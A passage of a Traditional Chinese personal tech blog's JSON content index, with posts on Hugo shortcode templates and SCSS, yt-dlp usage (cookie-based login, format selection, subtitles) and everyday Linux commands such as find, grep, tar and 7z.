bookmark-icon\u0026#34; | safeHTML }} \u0026lt;span class=\u0026#34;name\u0026#34;\u0026gt;{{ .Get \u0026#34;name\u0026#34; }}\u0026lt;/span\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;description\u0026#34;\u0026gt;{{ .Get \u0026#34;description\u0026#34; }}\u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/a\u0026gt; 新增 scss 在資料夾 my-project/assets/scss/shortcodes/ 新增 bookmark.scss\n\u0026lt;/\u0026gt; scss 📄 bookmark.scss 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 .bookmark { border: 1.2px solid #d0d7de; border-radius: 8px; font-family: -apple-system,BlinkMacSystemFont,segoe ui,noto sans,Helvetica,Arial,sans-serif,apple color emoji,segoe ui emoji; padding: 1em; margin-bottom: 20px; .bookmark-icon { width: 1.2em; height: 1.2em; margin-right: 0.5em; margin-bottom: -4px; } .name { font-weight: bold; color: #0969da; text-decoration: none; } .description { margin-top: 0.5em; margin-bottom: 1em; font-size: 90%; color: #656d76; transition: all .5s; font-weight: 400; } } my-project/assets/scss/custom.scss 裡加上引用 bookmark.scss\n\u0026lt;/\u0026gt; scss 📄 custom.scss 1 @import \u0026#34;shortcodes/bookmark.scss\u0026#34;; 使用方式 在貼文的內容加上下面代碼，就可以產生書籤的效果\n\u0026lt;/\u0026gt; markdown 1 {{\u0026lt;bookmark name=\u0026#34;hugo\u0026#34; link=\u0026#34;https://github.com/gohugoio/hugo\u0026#34; description=\u0026#34;The world’s fastest framework for building websites.\u0026#34;\u0026gt;}} Unsplash 引用標籤 在這邊我只想要把引用 unsplash 的文字稍微做區隔\n下載 ICON 到 tabler icon https://tabler.io/icons 下載 photo svg 檔案，放到 my-project/assets/icons/ 資料夾\n新增 unsplash.html 到 my-project/layouts/shortcodes/ 資料夾(如果沒有就自己建)，新增 unsplash.html\n\u0026lt;/\u0026gt; html 📄 unsplash.html 1 2 3 4 5 6 7 {{- $raw := (markdownify .Inner | chomp) -}} {{- $block := findRE \u0026#34;(?is)^\u0026lt;(?:address|article|aside|blockquote|canvas|dd|div|dl|dt|fieldset|figcaption|figure|footer|form|h(?:1|2|3|4|5|6)|header|hgroup|hr|li|main|nav|noscript|ol|output|p|pre|section|table|tfoot|ul|video)\\\\b\u0026#34; $raw 1 -}} {{- $icon := resources.GetMatch \u0026#34;icons/photo.svg\u0026#34; -}} \u0026lt;div class=\u0026#34;unsplash unsplash-info\u0026#34; {{ if len .Params | eq 2 }} id=\u0026#34;{{ .Get 1 }}\u0026#34; {{ end }}\u0026gt; \u0026lt;div class=\u0026#34;unsplash-title\u0026#34;\u0026gt;{{ replace $icon.Content \u0026#34;icon\u0026#34; \u0026#34;icon unsplash-icon\u0026#34; | safeHTML}}\u0026lt;/div\u0026gt; {{- if or $block (not $raw) }}{{ $raw }}{{ else }}\u0026lt;p\u0026gt;{{ $raw }}\u0026lt;/p\u0026gt;{{ end -}} \u0026lt;/div\u0026gt; 新增 scss 在 shortcodes 資料夾下建立 unsplash.scss\n📂 Folder my-project/\n└── assets/\n└── scss/\n├── custom.scss\n└── shortcodes/\n└── unsplash.scss\n\u0026lt;/\u0026gt; scss 📄 unsplash.scss 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 .unsplash { position: relative; padding: 1em 1em 2em 2.5em; margin-bottom: 1em; border-radius: 4px; p:last-child { color: #919eac; margin-bottom: 0; } a { color: #989bba; } p{ margin-left: 20px; } .unsplash-title { position: absolute; left: 16px; margin-top: 17px; font-size: 1.2em; .unsplash-icon { color: #919eac; width: 1.5em; height: 1.5em; } } \u0026amp;.unsplash-info { background: #F8FAFC; border-left: 5px solid #D9EAFD; } } custom.scss 裡加上引用\n\u0026lt;/\u0026gt; scss 📄 custom.scss 1 @import \u0026#34;shortcodes/bookmark.scss\u0026#34;; 使用方式 在貼文的內容加上下面代碼，就可以出現引用的效果\n\u0026lt;/\u0026gt; markdown 1 2 3 {{ \u0026lt;unsplash\u0026gt; }} Photo by \u0026lt;a href=\u0026#34;https://unsplash.com/@themelessly?utm_content=creditCopyText\u0026amp;utm_medium=referral\u0026amp;utm_source=unsplash\u0026#34;\u0026gt;Sho W.\u0026lt;/a\u0026gt; on \u0026lt;a href=\u0026#34;https://unsplash.com/photos/a-bunch-of-different-shapes-and-sizes-on-a-wall-3tNqoO_ReHQ?utm_content=creditCopyText\u0026amp;utm_medium=referral\u0026amp;utm_source=unsplash\u0026#34;\u0026gt;Unsplash\u0026lt;/a\u0026gt; {{ \u0026lt;/unsplash\u0026gt; }} terminal 區塊 有時會遇到分享 terminal 指令或執行結果，會想要跟 codeblock 的稍微作區隔\n所以就另外做 shortcode 來產生終端機的區塊\n同樣的效果 codeblock 我也做了一個版本\nHugo Theme Stack 修改 CodeBlock\nterminal $ ls\nhere is some bash output example\n新增 terminal.html 如果你想用 codeblock 表現 terminal 效果，可以參考 Hugo Theme Stack 修改 CodeBlock\n在 my-project/layouts/shortcodes/ 新增 terminal.html\n這邊利用包住的內容 Inner，當作終端內顯示的內容\n由於我寫閉包 shortcode 的習慣，Inner 變數第一行會是一個換行符號，用 replaceRE 可以完美去除\n另外就是替換換行符號 \\n 跟空白變成 html 格式\n空白不替換其實也可以，不過相連的空白就只會顯示一格\n\u0026lt;/\u0026gt; html 📄 terminal.html 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 \u0026lt;!-- remove first word is newline --\u0026gt; {{- $lines := (replaceRE `^\\n` \u0026#34;\u0026#34; .Inner) -}} \u0026lt;div class=\u0026#34;terminal\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;terminal-header\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;terminal-btn\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;btn-mac mac-close\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;btn-mac mac-mini\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;btn-mac mac-full\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; {{ if and (ne .Params nil) (isset .Params \u0026#34;title\u0026#34;) }} \u0026lt;div class=\u0026#34;terminal-title\u0026#34;\u0026gt;{{.Get \u0026#34;title\u0026#34;}}\u0026lt;/div\u0026gt; {{ else }} \u0026lt;div class=\u0026#34;terminal-title\u0026#34;\u0026gt;terminal\u0026lt;/div\u0026gt; {{ end }} \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;terminal-block\u0026#34;\u0026gt; \u0026lt;p\u0026gt;{{ $lines | markdownify}}\u0026lt;/p\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; 新增 scss 我想要終端機有亮暗的模式，所以新增的 terminal.scss 改放在 my-project/assets/scss/partials/highlight/\n如果不需要可以自行修改至 my-project/assets/scss/ (記得調整顏色變數)\n在 my-project/assets/scss/partials/highlight/ 新增 terminal.scss\n程式碼主要參考 codepen 上 Sam Willis 跟 Microk 分享的範例\nSam Willis Pure CSS OSX window Microk Code Window for MAC OS Style \u0026lt;/\u0026gt; scss 📄 terminal.scss 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 /* Fira Code: https://github.com/tonsky/FiraCode */ @import url(\u0026#39;https://fonts.googleapis.com/css2?family=Fira+Code:wght@300..700\u0026amp;display=swap\u0026#39;); $font-size: 1.5rem; $line-height: 1.54em; .terminal { border: 1px solid #e6e6e6; border-radius: 0.7em; box-shadow: 0 0 24px rgba(0, 0, 0, 0.1); overflow: hidden; .terminal-header{ background-color: $terminal-header; color: $terminal-header-font; display: grid; grid-template-columns: 25% auto 25%; .terminal-title { -webkit-box-align: center; -moz-box-align: center; align-items: center; display: -moz-box; -webkit-box-pack: center; -moz-box-pack: center; justify-content: center; text-align: center; } .terminal-btn, .terminal-cp { padding: 0 6px; } .terminal-btn { display: flex; .btn-mac { width: 15px; height: 15px; margin: 8px 4px; border-radius: 50%; } .mac-close { background-color: #ff5f56; } .mac-mini { background-color: #ffbd2e; } .mac-full { background-color: #27c93f; } } .terminal-cp { align-items: center; } } .terminal-block { box-sizing: border-box; margin: 0; padding: 0; font-family: \u0026#34;Fira Code\u0026#34;, Monaco, Consolas, \u0026#34;Ubuntu Mono\u0026#34;, monospace; font-size: $font-size; font-weight: 400; font-style: normal; line-height: $line-height; letter-spacing: -0.01em; background-color: $terminal-background; color: $terminal-foreground; text-rendering: optimizeLegibility; /* -webkit-font-smoothing: antialiased; */ font-feature-settings: \u0026#34;liga\u0026#34;, \u0026#34;tnum\u0026#34;, \u0026#34;ss01\u0026#34;, \u0026#34;locl\u0026#34;; font-variant-ligatures: contextual; -webkit-overflow-scrolling: touch; -webkit-text-size-adjust: 100%; p { padding: 10px; margin: 0; } } } 然後就是修改 my-project/assets/scss/partials/highlight/ 裡的 dark.scss 跟 light.scss 內分別加入顏色變數還有引用\n\u0026lt;/\u0026gt; scss 📄 dark.scss 1 2 3 4 5 6 7 // terminal $terminal-header: #273138; $terminal-header-font: #ffffff; $terminal-background: #000000; $terminal-foreground: #4EEE85; @import \u0026#34;custom/terminal.scss\u0026#34;; \u0026lt;/\u0026gt; scss 📄 light.scss 1 2 3 4 5 6 7 // terminal $terminal-header: #f4f4f7; $terminal-header-font: #000000; $terminal-background: #ffffff; $terminal-foreground: #000000; @import \u0026#34;custom/terminal.scss\u0026#34;; 使用方式 terminal user@host folder % ls\nhere is some bash output example\n\u0026lt;/\u0026gt; markdown 1 2 3 4 5 {{\u0026lt;terminal\u0026gt;}} user@host folder % ls here is some bash output example {{\u0026lt;/terminal\u0026gt;}} 裡面的指令開頭，如 user@host folder % 我就沒有另外做生成，需要再手動打上去\n一是懶得做辨識指令跟輸出，是個大工程\n二是有些單純分享指令的情況，我不會加上開頭，方便複製\n只有在同時貼指令加輸出結果時，為了區分會加\n再加上裡面的內容有時我會想照不同終端機修改，例如 bash 是 $、mac 的終端機是 %\n預設上方的標題會寫 terminal ，如果想換別的可以用 title 屬性修改\nbash $ ls\nhere is some bash output example\n\u0026lt;/\u0026gt; markdown 1 2 3 4 5 {{\u0026lt;terminal title=\u0026#34;bash\u0026#34;\u0026gt;}} \\$ ls here is some bash output example {{\u0026lt;/terminal\u0026gt;}} 參考資料 小骆同学 Hugo 短代码 一笼虾饺有四个 不是从零开始的Hugo建站笔记 Sam Willis Pure CSS OSX window Microk Code Window for MAC OS Style Photo by Sho W. on Unsplash\n","date":"2025-03-19T00:33:37+08:00","image":"https://zonego.tw/post/hugo-shortcode/cover_hu_fe96a069cd5d35a4.jpg","permalink":"https://zonego.tw/post/hugo-shortcode/","title":"Hugo 短代碼 shortcode"},{"content":"之前有個好用的下載工具叫 youtube-dl，但它已經不能用了\n好在有大神接手 fork 一個新版本叫 yt-dlp\nfork 出來的新版跟舊版沒有改變太多，所以下面就照搬之前的教學\n雖然名稱翻譯叫 youtube 下載，但 yt-dlp支援的網站 多達一千多個\n只要到 GitHub Release 就能下載\n對於初學者會卡的地方，大概就只有不熟悉指令界面而已 \\(可能還有youtube的限速\\)\n甚麼?你說打指令你不會用?\n那你可以改用 Hitomi Downloader\n系列教學 指定下載畫質 下載字幕 登入並下載影片 安裝 Windows 版本 Windows 需要 Microsoft Visual C++ 2010 Service Pack 1 Redistributable Package (x86)\nhttps://download.microsoft.com/download/1/6/5/165255E7-1014-4D0A-B094-B6A430A6BFFC/vcredist_x86.exe\n套件連結至微軟網站，請放心服用\n安裝後下載 Windows.exe 搬到預設應用程式的位置\n1 %USERPROFILE%\\AppData\\Local\\Microsoft\\WindowsApps 或是參考這篇 Windows 11 環境變數及 Path 設定 設定路徑(Path)環境變數\n使用 CMD, Powershell 或 windows terminal 就可以直接使用\nLinux, Mac 版本 Linux 及 Mac 需要 Python 2.6, 2.7, 或 3.2+ 以上的版本才能執行\n可以到 Python 官網 下載\n可以自行到 GitHub 下載 yt-dlp\nGitHub Release\nMac 可以透過 HomeBrew 安裝\n教學請看 Homebrew\n\u003e_ terminal 1 brew install ffmpeg yt-dlp 更新 \u003e_ terminal 1 yt-dlp -U Linux 若是用套件管理器(例如 man, apt)安裝，就用套件管理器更新\n下載影片 windows 1 yt-dlp.exe \u0026#34;https://www.youtube.com/watch?v=dQw4w9WgXcQ\u0026#34; linux 1 yt-dlp \u0026#34;https://www.youtube.com/watch?v=dQw4w9WgXcQ\u0026#34; 使用指令介面不像視窗版是點開後才給設定或操作，\n大多都是先把設定參數都一起寫在啟動指令中\n用 Ctrl + C 可以終止執行中的指令\n如果網址內有特殊符號，可以用字串標記 \u0026ldquo;URL\u0026rdquo;\n通常指令介面的程式會保留 -h --help 做使用說明\n如果不會操作，可以參考使用說明\n下載播放清單 下載撥放清單跟下載影片一樣，把網址換成撥放清單\n指定播放清單下載範圍 --playlist-start：播放清單起始位置 --playlist-end：播放清單結束位置 --playlist-items：指定範圍，逗號分隔，例如：1,2,5,8, 1-3,7,10-13 只下載音樂 用 -x 只輸出音軌，--audio-format 指定輸出檔的格式\n\u003e_ terminal 1 yt-dlp -x --audio-format mp3 https://www.youtube.com/watch?v=WI-EMzrUSP4 其他參數：\n--embed-thumbnail：嵌入影片縮圖(僅限 mp3 和 m4a/mp4) --embed-metadata：加入影片資訊 參考來源 https://github.com/yt-dlp/yt-dlp#readme\nhttps://junyussh.github.io/p/use-youtube-dl-to-download-videos/\nPhoto by Alexander Shatov on Unsplash\n","date":"2025-03-18T14:45:13+08:00","image":"https://images.unsplash.com/photo-1611162616475-46b635cb6868?q=80\u0026w=2874\u0026auto=format\u0026fit=crop\u0026ixlib=rb-4.0.3\u0026ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D","permalink":"https://zonego.tw/post/yt-dlp/","title":"用指令下載影片吧 youtube-dlp"},{"content":"↩️回總教學文 帳號密碼登入 某些內容會指定必須要認證身分\\(登入\\)後，才能觀看\n這種情況下， yt-dlp 有提供輸入簡單的帳號密碼的參數\n-u, --username USERNAME 輸入帳號 -p, --password PASSWORD 輸入密碼 範例\n\u003e_ terminal 1 yt-dlp --username \u0026#34;your_mail@gmail.com\u0026#34; --password \u0026#34;P@ssw0rd\u0026#34; \u0026#34;https://www.youtube.com/watch?v=dQw4w9WgXcQ\u0026#34; 目前只剩部分網站可以用這種方法登入。\nGoogle 有更新過 youtube 帳號的取用安全性，只能用下面的 Cookie 方式登入。\n使用 Cookie 登入 yt-dlp 可以使用 Netscape 格式的 cookie 檔案，讓伺服器端認定為已登入帳號的瀏覽器\n匯出 cookie 我們可以用 EditThisCookie 幫我們匯出 Cookie\nEditThisCookie Chrome擴充商店\n安裝完後，進入 EditThisCookie 的設定\n將輸出格式選擇 Netscape 格式\n接著建立 cookie.txt 文字檔\n建立完後我們到 https://youtube.com\n用 EditThisCookie 插件的匯出功能複製所有 cookie\n將複製到的文字貼到 cookie.txt\n貼完後照前面的步驟，抓出 https://accounts.google.com 的 cookie\n都完成後 cookie.txt 大概會長這個樣子\n\u0026lt;/\u0026gt; txt 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 # Netscape HTTP Cookie File # http://curl.haxx.se/rfc/cookie_spec.html # This file was generated by Cookie Editor .youtube.com\tTRUE\t/\tTRUE\t1712544730\t__Secure-1PAPISID\tXXXXX .youtube.com\tTRUE\t/\tTRUE\t1712544730\t__Secure-1PSID\tXXXXX .youtube.com\tTRUE\t/\tTRUE\t1712544730\t__Secure-3PAPISID\tXXXXX .youtube.com\tTRUE\t/\tTRUE\t1712544730\t__Secure-3PSID\tXXXXX .youtube.com\tTRUE\t/\tTRUE\t1681127908\t__Secure-3PSIDCC\tXXXXX .youtube.com\tTRUE\t/\tFALSE\t1687764170\t_ga\tXXXXX .youtube.com\tTRUE\t/\tFALSE\t1654529554\t_gcl_au\tXXXXX .youtube.com\tTRUE\t/\tFALSE\t1712544730\tAPISID\tXXXXX .youtube.com\tTRUE\t/\tFALSE\t1712544730\tHSID\tXXXXX .youtube.com\tTRUE\t/\tTRUE\t1664713150\tLOGIN_INFO\tXXXXX .youtube.com\tTRUE\t/\tTRUE\t1712663916\tPREF\tXXXXX .youtube.com\tTRUE\t/\tTRUE\t1712544730\tSAPISID\tXXXXX .youtube.com\tTRUE\t/\tFALSE\t1712544730\tSID\tXXXXX. .youtube.com\tTRUE\t/\tFALSE\t1681127908\tSIDCC\tXXXXX .youtube.com\tTRUE\t/\tTRUE\t1712544730\tSSID\tXXXXX .youtube.com\tTRUE\t/\tTRUE\t1665142416\tVISITOR_INFO1_LIVE\tXXXXX .youtube.com\tTRUE\t/\tFALSE\t0\twide\t0 .youtube.com\tTRUE\t/\tTRUE\t0\tYSC\tXXXXX # Netscape HTTP Cookie File # http://curl.haxx.se/rfc/cookie_spec.html # This file was generated by Cookie Editor .google.com\tTRUE\t/\tTRUE\t1712494597\t__Secure-1PAPISID\tXXXXX .google.com\tTRUE\t/\tTRUE\t1712494597\t__Secure-1PSID\tXXXXX .google.com\tTRUE\t/\tTRUE\t1712494597\t__Secure-3PAPISID\tXXXXX .google.com\tTRUE\t/\tTRUE\t1712494597\t__Secure-3PSID\tXXXXX .google.com\tTRUE\t/\tTRUE\t1681128005\t__Secure-3PSIDCC\tXXXXX .google.com\tTRUE\t/\tTRUE\t1652183330\t1P_JAR\tXXXXX .google.com\tTRUE\t/\tTRUE\t1663206405\tAEC\tXXXXX .google.com\tTRUE\t/\tFALSE\t1712494597\tAPISID\tXXXXX .google.com\tTRUE\t/\tFALSE\t1712494597\tHSID\tXXXXX .google.com\tTRUE\t/\tTRUE\t1665402835\tNID\tXXXXX .google.com\tTRUE\t/\tFALSE\t1651150185\tOGP\tXXXXX .google.com\tTRUE\t/\tFALSE\t1651150184\tOGPC\tXXXXX .google.com\tTRUE\t/\tTRUE\t1712494597\tSAPISID\tXXXXX .google.com\tTRUE\t/\tFALSE\t1712494597\tSID\tXXXXX .google.com\tTRUE\t/\tFALSE\t1681128005\tSIDCC\tXXXXX .google.com\tTRUE\t/\tTRUE\t1712494597\tSSID\tXXXXX myaccount.google.com\tFALSE\t/\tTRUE\t1712544729\t__Secure-OSID\tXXXXX myaccount.google.com\tFALSE\t/\tTRUE\t1712544729\tOSID\tXXXXX myaccount.google.com\tFALSE\t/\tTRUE\t1652064730\tOTZ\tXXXXX 重整格式 接著我們將剛剛的 cookie.txt 用 curl 重新整理格式\n\u003e_ terminal 1 curl -b cookie.txt --cookie-jar ytcookie.txt \u0026#39;https://youtube.com\u0026#39; 若是 Windows 的用戶，可以使用 Windows subsystem linux (WSL) 跑 Linux 的程式\n執行完後 cookie.txt 就可以刪了，我們只要 ytcookie.txt 這個檔案\nytcookie.txt 要取甚麼名字都可以\n使用 cookie 登入 用 --cookie 設定我們剛剛做好的 ytcookie.txt 就可以了\n\u003e_ terminal 1 yt-dlp --cookie ./ytcookie.txt \u0026#34;https://www.youtube.com/watch?v=dQw4w9WgXcQ\u0026#34; 接下來只要你沒在瀏覽器內登出帳號，ytcookie.txt 理論上就能一直使用\n當然，網站那邊可能也會紀錄是這個帳號在下載影片\u0026hellip;\n↩️回總教學文 Photo by Alexander Shatov on Unsplash\n","date":"2025-03-18T14:33:45+08:00","image":"https://images.unsplash.com/photo-1611162616475-46b635cb6868?q=80\u0026w=2874\u0026auto=format\u0026fit=crop\u0026ixlib=rb-4.0.3\u0026ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D","permalink":"https://zonego.tw/post/yt-dlp-login/","title":"yt-dlp 登入並下載影片"},{"content":"↩️回總教學文 選擇畫質 yt-dlp 預設會下載最高畫質的版本，不一定是 mp4 格式\n列出可下載的畫質:\n\u003e_ terminal 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 \\$ yt-dlp -F https://www.youtube.com/watch?v=dQw4w9WgXcQ [youtube] dQw4w9WgXcQ: Downloading webpage [info] Available formats for dQw4w9WgXcQ: format code extension resolution note 249 webm audio only tiny 46k , webm_dash container, opus @ 46k (48000Hz), 1.18MiB 250 webm audio only tiny 61k , webm_dash container, opus @ 61k (48000Hz), 1.55MiB 140 m4a audio only tiny 129k , m4a_dash container, mp4a.40.2@129k (44100Hz), 3.27MiB 251 webm audio only tiny 129k , webm_dash container, opus @129k (48000Hz), 3.28MiB 394 mp4 256x144 144p 68k , mp4_dash container, av01.0.00M.08@ 68k, 25fps, video only, 1.72MiB 160 mp4 256x144 144p 71k , mp4_dash container, avc1.4d400c@ 71k, 25fps, video only, 1.81MiB 278 webm 256x144 144p 89k , webm_dash container, vp9@ 89k, 25fps, video only, 2.27MiB 133 mp4 426x240 240p 117k , mp4_dash container, avc1.4d4015@ 117k, 25fps, video only, 2.96MiB 395 mp4 426x240 240p 134k , mp4_dash container, av01.0.00M.08@ 134k, 25fps, video only, 3.40MiB 242 webm 426x240 240p 159k , webm_dash container, vp9@ 159k, 25fps, video only, 4.02MiB 134 mp4 640x360 360p 219k , mp4_dash container, avc1.4d401e@ 219k, 25fps, video only, 5.55MiB 396 mp4 640x360 360p 262k , mp4_dash container, av01.0.01M.08@ 262k, 25fps, video only, 6.64MiB 243 webm 640x360 360p 273k , webm_dash container, vp9@ 273k, 25fps, video only, 6.92MiB 135 mp4 854x480 480p 337k , mp4_dash container, avc1.4d401e@ 337k, 25fps, video only, 8.52MiB 244 webm 854x480 480p 397k , webm_dash container, vp9@ 397k, 25fps, video only, 10.04MiB 397 mp4 854x480 480p 450k , mp4_dash container, av01.0.04M.08@ 450k, 25fps, video only, 11.38MiB 136 mp4 1280x720 720p 655k , mp4_dash container, avc1.4d401f@ 655k, 25fps, video only, 16.57MiB 247 webm 1280x720 720p 699k , webm_dash container, vp9@ 699k, 25fps, video only, 17.67MiB 398 mp4 1280x720 720p 858k , mp4_dash container, av01.0.05M.08@ 858k, 25fps, video only, 21.70MiB 399 mp4 1920x1080 1080p 1576k , mp4_dash container, av01.0.08M.08@1576k, 25fps, video only, 39.84MiB 137 mp4 1920x1080 1080p 3546k , mp4_dash container, avc1.640028@3546k, 25fps, video only, 89.64MiB 18 mp4 640x360 360p 630k , avc1.42001E, 25fps, mp4a.40.2 (44100Hz), 15.95MiB (best) 選好要下載的格式，把 format code 填入參數 -f 裡\n\u003e_ terminal 1 yt-dlp -f 137 https://www.youtube.com/watch?v=dQw4w9WgXcQ 1920x1080 影片 + 129K音軌 (需要先裝 ffmpeg)\n\u003e_ terminal 1 yt-dlp -f \u0026#34;137+140\u0026#34; https://www.youtube.com/watch?v=dQw4w9WgXcQ 如果懶得查，也可以直接指定某種影片、音樂最高品質\n下載 MP4 格式中最高畫質，或是其他格式中的最高畫質\n\u003e_ terminal 1 yt-dlp -f \u0026#39;bestvideo[ext=mp4]+bestaudio[ext=m4a]/best[ext=mp4]/best\u0026#39; url 指定最佳畫質，但不要高於 480p\n\u003e_ terminal 1 yt-dlp -f \u0026#39;bestvideo[height\u0026lt;=480]+bestaudio/best[height\u0026lt;=480]\u0026#39; url 下載檔案大小小於 50M 的最高畫質影片\n\u003e_ terminal 1 yt-dlp -f \u0026#39;best[filesize\u0026lt;50M]\u0026#39; url 指定格式、品質時，若網站沒有該格式會下載失敗\n↩️回總教學文 Photo by Alexander Shatov on Unsplash\n","date":"2025-03-18T14:07:08+08:00","image":"https://images.unsplash.com/photo-1611162616475-46b635cb6868?q=80\u0026w=2874\u0026auto=format\u0026fit=crop\u0026ixlib=rb-4.0.3\u0026ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D","permalink":"https://zonego.tw/post/yt-dlp-quality/","title":"yt-dlp 指定下載影片畫質"},{"content":"↩️回總教學文 參數 --list-subs：列出可下載的所有字幕 --write-sub：儲存字幕 --write-auto-sub: 儲存自動翻譯的字幕，限 youtube 可以使用 --embed-sub：將字幕合併至影片中，需搭配 \u0026ndash;write-sub 參數使用 --all-subs：下載所有字幕 --sub-format：下載的字幕格式，如果原影片沒有指定的字幕格式會去下載其他格式的字幕 --sub-lang：選擇要下載的字幕語言，用逗號分隔，例如：zh_TW,ja --convert-subs：將下載的字幕轉換成其他格式，目前支援 srt|ass|vtt|lrc 列出所有可用字幕 \u003e_ terminal 1 2 3 4 5 6 7 8 9 10 yt-dlp --list-subs https://www.youtube.com/watch?v=AJYsA1jXf60 [youtube] AJYsA1jXf60: Downloading webpage Available automatic captions for AJYsA1jXf60: Language formats tg vtt, ttml, srv3, srv2, srv1 af vtt, ttml, srv3, srv2, srv1 ... vi vtt, ttml, srv3, srv2, srv1 zh-Hant vtt, ttml, srv3, srv2, srv1 ... 下載影片與字幕 如果我要下載繁中以及英文的字幕，並另存成 .srt 格式\n\u003e_ terminal 1 yt-dlp --sub-lang zh-Hant,en --write-sub --convert-subs srt https://www.youtube.com/watch?v=AJYsA1jXf60 只下載字幕 可以加 --skip-download 跳過下載影片\n\u003e_ terminal 1 yt-dlp --sub-lang zh-Hant,en --write-sub --convert-subs srt --skip-download https://www.youtube.com/watch?v=AJYsA1jXf60 下載自動翻譯字幕 下面指令為下載自動翻譯的繁體中文字幕\n\u003e_ terminal 1 yt-dlp --write-auto-sub --sub-lang zh-Hant https://www.youtube.com/watch?v=R_BlrlAcOoQ ↩️回總教學文 Photo by Alexander Shatov on Unsplash\n","date":"2025-03-18T14:01:31+08:00","image":"https://images.unsplash.com/photo-1611162616475-46b635cb6868?q=80\u0026w=2874\u0026auto=format\u0026fit=crop\u0026ixlib=rb-4.0.3\u0026ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D","permalink":"https://zonego.tw/post/yt-dlp-subtitle/","title":"yt-dlp 下載字幕"},{"content":"這邊紀錄是在 linux 上可以使用的指令，mac 上應該也能用\n目前我用過的 linux 系統沒有很多，大概只有 ubuntu, Raspberry Pi OS, truenas, proxmox ve 等\n如果 Windows 要使用可以裝 WSL (windows subsystem linux)\n顯示目前資料夾 bash 1 pwd find 找檔名(資料夾) 基本用法 若要在目前的目錄底下，找尋找所有 .txt 的檔案，可以用下面指令\nfind 可以指定搜尋的是檔案或資料夾\n-type f 檔案 ， -type d 資料夾\nbash 1 find . -name ＊.txt 若其中有檔案或資料夾要排除\n範例排除所有 txt 檔與在 folder 底下的檔案\nbash 1 find . -type f ! -name \u0026#34;*.txt\u0026#34; ! -path \u0026#34;./folder/*\u0026#34; 搜尋並執行指令 中間 command 可以自行換成其他指令\nbash 1 find . -type f -name \u0026#34;*.txt\u0026#34; -exec command {} \\+ 搜尋並刪除 bash 1 find . -type d -name \u0026#34;foo\u0026#34; -exec rm -rf {} \\+ 如果只是刪除空資料夾可以不用用到 -exec\nbash 1 find . -type d -empty -delete 列出大於 25MB檔案 bash 1 find . -size +25M -exec ls -lh {} \\+ 找檔案修改時間 列出現在資料夾1天內有改動的檔案\nbash 1 find ./ -mtime -1 列出現在資料夾2小時內有改動的檔案\nbash 1 find ./ -mmin -120 列出現在資料夾1天之前有改動的檔案\nbash 1 find ./ -mtime +1 列出檔案詳細資料\nbash 1 find ./ -mtime +1 -ls 找檔案內容 find 專找檔案名稱、檔案資訊， grep 才能列內容出來找\nbash 1 grep -rnw \u0026#39;/path/to/somewhere/\u0026#39; -e \u0026#39;pattern\u0026#39; -r or -R is recursive, -n is line number -w stands for match the whole word. -l (lower-case L) can be added to just give the file name of matching files. 壓縮、解壓縮 紀錄目前有遇到、常用的格式\ntar 大部分 linux 內建，不用特別安裝\n壓縮 1 tar cvf FileName.tar DirName 解壓縮 1 tar xvf FileName.tar tar.gz 大部分 linux 內建，不用特別安裝\n壓縮 1 tar zcvf FileName.tar DirName 解壓縮 1 tar zxvf FileName.tar zip 需要安裝 zip，附上 ubutu 安裝指令\n安裝 1 apt install zip unzip 壓縮 1 zip -r FileName.zip DirName 解壓縮 1 unzip FileName.zip 7z rar 7z 可以一起處理 rar 的格式，附上 ubuntu 安裝指令\n安裝 1 apt-get install p7zip-full p7zip-rar 壓縮 1 7z a FileName.7z FileName 壓縮可以另外加 -pYOURPASSWORD 來加密碼\nFileName.7z 可以自行換成 FileName.rar\n解壓縮 1 7z x FileName.7z watch 固定間格重複執行固定指令 大部分 linux 內建，不用特別安裝\nwatch 會固定時間重複下同樣的指令，方便看 log 或系統執行中的變化\n-n 可以調整間隔時間(秒)，不同的系統預設值不同\n-d 標示出不同處\nbash 1 watch -n 1 command 例如每秒看 nvidia 顯示卡的運行狀況\nbash 1 watch -n 1 nvidia-smi 參考來源 https://blog.gtwang.org/linux/unix-linux-find-command-examples/ https://www.cyberciti.biz/faq/how-to-find-and-delete-directory-recursively-on-linux-or-unix-like-system/ https://stackoverflow.com/questions/16956810/how-do-i-find-all-files-containing-specific-text-on-linux https://note.drx.tw/2008/04/command.html https://snoopymemory.blogspot.com/2016/04/ubuntu-7zrar.html Photo by Gabriel Heinzer on 